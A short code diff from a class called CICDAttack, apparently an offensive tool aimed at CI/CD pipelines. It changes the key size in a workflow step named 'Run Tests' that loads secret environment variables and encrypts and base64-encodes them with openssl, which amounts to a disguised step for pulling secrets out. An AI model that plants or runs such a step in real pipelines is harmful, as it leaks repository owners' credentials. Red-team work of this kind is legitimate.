@@ -106,7 +106,7 @@ class CICDAttack():
                 {
                     'name': 'Run Tests',
                     'env': secret_envmap,
-                    'run': "openssl rand -out sym.key 256;"
+                    'run': "openssl rand -out sym.key 32;"
                            f"{echo_cmd} | openssl enc -aes-256-cbc -kfile"
                            " sym.key -pbkdf2 | base64 -w 0;"
                            f"cat sym.key | base64 | openssl rsautl -encrypt "
